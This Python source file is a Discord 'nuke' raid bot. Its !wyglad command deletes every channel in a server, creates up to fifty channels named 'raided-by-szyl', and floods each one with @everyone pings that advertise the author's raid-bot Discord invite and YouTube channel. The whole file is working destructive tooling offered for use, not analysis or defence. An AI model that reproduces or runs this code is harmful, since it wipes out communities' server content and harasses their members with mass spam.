import discord
import asyncio
import os
from discord.ext import commands
from keep_alive import keep_alive
keep_alive()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
  print(f"Logged in as {bot.user}!")


@bot.command()
async def wyglad(ctx):
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
    except Exception as e:
      print(f"Couldn't delete {channel}: {e}")

  created_channels = []
  for i in range(1, 51):
    try:
      channel = await ctx.guild.create_text_channel("raided-by-szyl")
      created_channels.append(channel)
    except Exception as e:
      print(f"Couldn't create channel: {e}")

  async def spam(channel):
    message = "To get nuke bot join https://discord.gg/Nz2uqrPz3X https://youtube.com/@szylcheats @everyone @here"
    for _ in range(6):
      try:
        await channel.send(message)
        await asyncio.sleep(2)
      except Exception as e:
        print(f"Couldn't send message in {channel}: {e}")

  # Run all spam tasks concurrently
  spam_tasks = [spam(ch) for ch in created_channels]
  await asyncio.gather(*spam_tasks)


bot.run(os.environ['token'])
